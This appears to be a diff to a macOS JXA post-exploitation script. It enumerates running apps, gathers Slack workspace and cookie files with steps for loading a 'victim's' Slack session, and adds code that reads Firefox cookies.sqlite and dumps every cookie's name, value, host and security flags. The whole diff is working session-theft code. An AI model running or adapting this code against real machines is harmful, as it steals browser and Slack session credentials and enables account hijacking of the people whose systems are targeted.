@@ -18,7 +18,7 @@ for(let i = 0; i < runapps.length; i++){
 	let info = {};
 	info['name'] = runapps[i].localizedName.js;
 	applist.push(info['name']);
-	
+
 }
 
 var allapps = applist.toString();
@@ -333,7 +333,7 @@ if (fileMan.fileExistsAtPath(swPath)){
 		results += contents3[q] + "\n";
 		}
 	}
-	
+
 	results += "\nSteps from Cody's article to load the Slack files found:\n1. Pull the slack-workspaces and Cookies files from the host.\n2. Install a new instance of slack (but don’t sign in to anything)\n3. Close Slack and replace the automatically created Slack/storage/slack-workspaces and Slack/Cookies files with the two you downloaded from the victim\n4. Start Slack";
 
 	}
@@ -342,7 +342,72 @@ if (fileMan.fileExistsAtPath(swPath)){
                 results += "\n";
         }
 
+				results += "#######################################\n";
+
 }
+
+//----------firefox cookies------------------
+var output = "";
+var fileMan = $.NSFileManager.defaultManager;
+var err;
+var username = $.NSUserName().js
+var ffoxpath = '/Users/' + username + '/Library/Application\ Support/Firefox/Profiles';
+if (fileMan.fileExistsAtPath(ffoxpath)){
+	results += "\n[+] Firefox cookies.sqlite:\n";
+	let prof_folders = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(ffoxpath,$()));
+	try{
+		for (p=0; p< prof_folders.length; p++){
+			if ((prof_folders[p]).includes('-release')){
+				var changeto = ffoxpath + "/" + prof_folders[p];
+				var dircontents = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(changeto,$()));
+				for (n=0; n<dircontents.length; n++){
+					if (dircontents[n] == 'cookies.sqlite'){
+						var ckpath = changeto + "/" + dircontents[n];
+						var ppDb = Ref();
+						var err = $.sqlite3_open(ckpath, ppDb)
+						var db = ppDb[0]
+						if(err != $.SQLITE_OK) throw new Error($.sqlite3_errmsg(db))
+						var sql = 'select name,value,host,path,datetime(expiry,\'unixepoch\') as expiredate,isSecure,isHttpOnly,sameSite from moz_cookies'
+						var ppStmt = Ref()
+						var err = $.sqlite3_prepare(db, sql, -1, ppStmt, Ref())
+						if(err != $.SQLITE_OK) throw new Error($.sqlite3_errmsg(db))
+						pStmt = ppStmt[0]
+						try{
+							results += 'FORMAT: cookie name | cookie value | host | path | expire date | isSecure | isHttpOnly | sameSite\n';
+							results += '___________________________________________________________________________________________________\n';
+							while((err = $.sqlite3_step(pStmt)) == $.SQLITE_ROW){
+								results += $.sqlite3_column_text(pStmt,0) + " | " + $.sqlite3_column_text(pStmt,1) + " | " + $.sqlite3_column_text(pStmt,2) + " | " + $.sqlite3_column_text(pStmt,3) + " | " + $.sqlite3_column_text(pStmt,4) + " | " + $.sqlite3_column_text(pStmt,5) + " | " + $.sqlite3_column_text(pStmt,6) + " | " + $.sqlite3_column_text(pStmt,7) + " | \n"
+							}
+							results += '#####################################################################################################\n';
+							return results
+						}
+						catch(error){
+							results += error.toString()
+							return results
+
+						}
+						//finally{
+							//var err = $.sqlite3_finalize(pStmt)
+							//var err = $.sqlite3_close(db)
+							//if(err != $.SQLITE_OK) throw new Error($.sqlite3_errmsg(db))
+						//}
+					}
+
+
+
+				}
+
+
+
+			}
+		}
+	}
+
+catch(err){
+}
+results += "#######################################\n";
+}
+
 
 //console.log(results)
 
